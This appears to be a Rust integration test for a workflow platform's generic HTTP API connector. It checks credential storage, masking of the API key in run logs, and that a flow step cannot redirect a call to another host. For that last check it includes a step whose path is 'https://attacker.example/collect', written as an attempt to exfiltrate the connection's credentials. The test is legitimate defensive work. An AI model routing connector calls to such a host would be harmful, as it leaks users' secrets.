//! "Any app (HTTP API)" through the real API: a connection to an arbitrary REST API stores only the fields its
//! sign-in type uses, a flow calls the app with the connection's credentials, and the run log never shows them.

use serde_json::json;
use wiremock::{
    Mock, MockServer, ResponseTemplate,
    matchers::{method, path, query_param},
};

use crate::harness::TestApp;

#[tokio::test]
async fn any_app_connects_with_its_own_credentials_and_a_flow_calls_it() {
    let app = TestApp::spawn().await;
    let api = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/v2/ping"))
        .and(query_param("apikey_x", "K-123"))
        .respond_with(ResponseTemplate::new(200).set_body_json(json!({"ok": true})))
        .mount(&api)
        .await;
    Mock::given(method("POST"))
        .and(path("/v2/tickets"))
        .and(query_param("apikey_x", "K-123"))
        .respond_with(ResponseTemplate::new(201).set_body_json(json!({"ticket": 55})))
        .mount(&api)
        .await;
    let (status, cxn) = app
        .req(
            "POST",
            "/api/v1/connections",
            Some(json!({"connector": "http_api", "name": "Helpdesk",
                "fields": {"base_url": format!("{}/v2", api.uri()), "auth": "api_key_query", "query_name": "apikey_x",
                    "api_key": "K-123", "token": "ignored-bearer", "test_path": "/ping"}})),
        )
        .await;
    assert_eq!(status.as_u16(), 201, "{cxn}");
    assert_eq!(cxn["status"], "active", "the connection test passed: {cxn}");
    assert!(
        cxn["config"].get("header_name").is_none(),
        "fields of other sign-in types are not stored: {cxn}"
    );
    let id = cxn["id"].as_str().unwrap();
    let flow = app
        .live_flow("Open ticket", json!({"trigger": {"type": "manual"}, "steps": [
            {"key": "ticket", "type": "action", "connector": "http_api", "action": "api_call", "connection_id": id,
                "input": {"method": "POST", "path": "/tickets", "body": {"subject": "{{ trigger.subject }}"}}}
        ]}))
        .await;
    let r = app
        .ok(
            "POST",
            &format!("/api/v1/flows/{}/run", flow["id"].as_str().unwrap()),
            Some(json!({"payload": {"subject": "Printer jam"}})),
        )
        .await;
    app.drain().await;
    let exe = r["execution_id"].as_str().unwrap();
    let run = app
        .ok("GET", &format!("/api/v1/executions/{exe}"), None)
        .await;
    assert_eq!(run["status"], "succeeded", "{run}");
    assert_eq!(run["steps"][0]["output"]["body"]["ticket"], 55);
    let log = app
        .ok("GET", &format!("/api/v1/executions/{exe}/log"), None)
        .await;
    assert!(
        !log.to_string().contains("K-123"),
        "the connection's key never reaches the log: {log}"
    );
    assert!(log.to_string().contains("apikey_x=***"), "{log}");
    // A path may not send the credentials to another host.
    let bad = app
        .live_flow("Leak", json!({"trigger": {"type": "manual"}, "steps": [
            {"key": "x", "type": "action", "connector": "http_api", "action": "api_call", "connection_id": id,
                "input": {"method": "GET", "path": "https://attacker.example/collect"}}
        ]}))
        .await;
    let r = app
        .ok(
            "POST",
            &format!("/api/v1/flows/{}/run", bad["id"].as_str().unwrap()),
            Some(json!({"payload": {}})),
        )
        .await;
    app.drain().await;
    let run = app
        .ok(
            "GET",
            &format!("/api/v1/executions/{}", r["execution_id"].as_str().unwrap()),
            None,
        )
        .await;
    assert_eq!(run["status"], "failed");
    assert_eq!(run["error_code"], "app.invalid_input");
    app.cleanup().await;
}
